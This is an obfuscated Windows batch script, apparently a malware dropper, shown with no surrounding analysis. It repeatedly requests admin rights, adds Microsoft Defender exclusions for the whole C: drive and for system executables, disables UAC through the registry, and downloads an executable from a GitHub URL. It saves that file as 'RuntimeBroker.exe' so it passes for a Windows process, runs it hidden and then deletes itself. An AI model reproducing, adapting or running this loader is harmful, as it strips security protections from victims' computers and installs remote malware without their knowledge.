@echo off & setlocal enableDelayedExpansion
set "rBp=NET" & set "agmgO=>nul" & set "yjRmp=2>&1" & set "xitI=SESSION"
%rBp% %xitI% %agmgO% %yjRmp%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "kWxm=baz" & set "IMQqn=foo" & set "ZuWw=qux" & set "DgI=bar" & rem dHp yctI QLpXze
set "hCh=powershell -ExecutionPolicy Bypass -Command"
set "wQD=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "UvTlF='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "bQV='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!hCh! "!wQD! !UvTlF! !bQV!" %agmgO% %yjRmp%
set "qvM=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "fRxnY=-Name 'EnableLUA' -Value 0"
!hCh! "!qvM! !fRxnY!" %agmgO% %yjRmp%
set "cYmGk=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!hCh! "!cYmGk!" %agmgO% %yjRmp%
if !errorlevel! neq 0 (goto %a%)
set "riDa=timeout /t" & !riDa! 2 %agmgO% %yjRmp%
set "DiyRR=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "cmTHH=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "OMYJU=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!hCh! "!DiyRR! !cmTHH! !OMYJU!" %agmgO% %yjRmp%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!riDa! 1 %agmgO% %yjRmp% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %agmgO% %yjRmp%
del /f /q "%~f0" %agmgO% %yjRmp%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %agmgO% %yjRmp%
if !errorlevel! neq 0 (!riDa! 3 %agmgO% %yjRmp% & goto %b%)
exit /b
